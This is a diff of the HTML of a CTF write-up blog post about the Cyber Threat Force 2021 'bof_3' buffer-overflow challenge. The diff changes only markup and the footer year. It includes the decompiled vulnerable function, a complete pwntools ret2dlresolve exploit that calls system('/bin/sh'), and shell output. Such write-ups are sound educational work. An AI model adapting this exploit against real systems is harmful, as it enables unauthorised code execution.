@@ -8,82 +8,81 @@ undefined4 main(void) { ignorMe(&amp;amp;stack0x00000004); puts(&amp;#34;passwor
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we also were given a service executable. It was hosted remotely.</p><p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec ./service
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
-</span></span><span style=display:flex><span>    Arch:     i386-32-little
-</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
-</span></span><span style=display:flex><span>    Stack:    No canary found
-</span></span><span style=display:flex><span>    NX:       NX enabled
-</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ ./service
-</span></span><span style=display:flex><span>password: 
-</span></span><span style=display:flex><span>mypassword
-</span></span><span style=display:flex><span>nop
-</span></span></code></pre></div><p>NX enabled, and partial RELRO. Let&rsquo;s take a look at the binary using Ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
-</span></span><span style=display:flex><span>  ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
-</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;password: &#34;</span>);
-</span></span><span style=display:flex><span>  vuln();
-</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;nop&#34;</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>void</span>) {
-</span></span><span style=display:flex><span>  undefined local_70 [<span style=color:#ae81ff>104</span>];
-</span></span><span style=display:flex><span>  
-</span></span><span style=display:flex><span>  read(<span style=color:#ae81ff>0</span>,local_70,<span style=color:#ae81ff>0x96</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>We have an overflow, but not much else going on. We won&rsquo;t be able to leak an address from the libc using a format string exploit, like on <a href=/blog/writeup-cyber-threat-force-2021-pwn-bof-2>the last challenge</a>.</p><p>We can try the <a href=https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve>ret2dlresolve</a> technique. Pwntools even has a nice module for it.</p><p>I found the offset using <code>cyclic</code> from pwntools.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
-</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;XXX.XXX.XXX.XXX&#39;</span>, <span style=color:#ae81ff>00000</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
-</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> conn()
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;:&#39;</span>)
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>112</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    rop <span style=color:#f92672>=</span> ROP(exe)
-</span></span><span style=display:flex><span>    dlresolve <span style=color:#f92672>=</span> Ret2dlresolvePayload(exe, symbol<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;system&#34;</span>, args<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;/bin/sh&#34;</span>])
-</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, dlresolve<span style=color:#f92672>.</span>data_addr)
-</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>ret2dlresolve(dlresolve)
-</span></span><span style=display:flex><span>    raw_rop <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>chain()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(flat({offset: bytes(rop)}))
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(dlresolve<span style=color:#f92672>.</span>payload)
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>interactive()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
-</span></span><span style=display:flex><span>    main()
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python solve.py LOCAL
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
-</span></span><span style=display:flex><span>    Arch:     i386-32-little
-</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
-</span></span><span style=display:flex><span>    Stack:    No canary found
-</span></span><span style=display:flex><span>    NX:       NX enabled
-</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>: pid <span style=color:#ae81ff>846530</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded <span style=color:#ae81ff>10</span> cached gadgets <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;./service&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
-</span></span><span style=display:flex><span>$ pwd
-</span></span><span style=display:flex><span>/home/vivescere/ctf/bof_3
-</span></span></code></pre></div><p>The flag is <code>CYBERTF{Zeroleak@nd_bruteF0rc3}</code>. It was in <code>/home/ctf/flag.txt</code>.</p><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/><span class=button__icon>←</span>
+#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we also were given a service executable. It was hosted remotely.</p><p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec ./service
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
+
+$ ./service
+password: 
+mypassword
+nop
+</code></pre></div><p>NX enabled, and partial RELRO. Let&rsquo;s take a look at the binary using Ghidra:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
+  ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
+  puts(<span style=color:#e6db74>&#34;password: &#34;</span>);
+  vuln();
+  puts(<span style=color:#e6db74>&#34;nop&#34;</span>);
+  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>void</span>) {
+  undefined local_70 [<span style=color:#ae81ff>104</span>];
+  
+  read(<span style=color:#ae81ff>0</span>,local_70,<span style=color:#ae81ff>0x96</span>);
+  <span style=color:#66d9ef>return</span>;
+}
+</code></pre></div><p>We have an overflow, but not much else going on. We won&rsquo;t be able to leak an address from the libc using a format string exploit, like on <a href=/blog/writeup-cyber-threat-force-2021-pwn-bof-2>the last challenge</a>.</p><p>We can try the <a href=https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve>ret2dlresolve</a> technique. Pwntools even has a nice module for it.</p><p>I found the offset using <code>cyclic</code> from pwntools.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)
+
+context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
+    <span style=color:#66d9ef>else</span>:
+        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;XXX.XXX.XXX.XXX&#39;</span>, <span style=color:#ae81ff>00000</span>)
+
+    <span style=color:#66d9ef>return</span> r
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    r <span style=color:#f92672>=</span> conn()
+    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;:&#39;</span>)
+    r<span style=color:#f92672>.</span>recvline()
+    
+    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>112</span>
+
+    rop <span style=color:#f92672>=</span> ROP(exe)
+    dlresolve <span style=color:#f92672>=</span> Ret2dlresolvePayload(exe, symbol<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;system&#34;</span>, args<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;/bin/sh&#34;</span>])
+    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, dlresolve<span style=color:#f92672>.</span>data_addr)
+    rop<span style=color:#f92672>.</span>ret2dlresolve(dlresolve)
+    raw_rop <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>chain()
+
+    r<span style=color:#f92672>.</span>sendline(flat({offset: bytes(rop)}))
+    r<span style=color:#f92672>.</span>sendline(dlresolve<span style=color:#f92672>.</span>payload)
+    r<span style=color:#f92672>.</span>interactive()
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python solve.py LOCAL
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>: pid <span style=color:#ae81ff>846530</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded <span style=color:#ae81ff>10</span> cached gadgets <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;./service&#39;</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
+$ pwd
+/home/vivescere/ctf/bof_3
+</code></pre></div><p>The flag is <code>CYBERTF{Zeroleak@nd_bruteF0rc3}</code>. It was in <code>/home/ctf/flag.txt</code>.</p><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/><span class=button__icon>←</span>
 <span class=button__text>Writeup Cyber Threat Force : PrivEsc</span></a></span>
 <span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/><span class=button__text>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
-<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
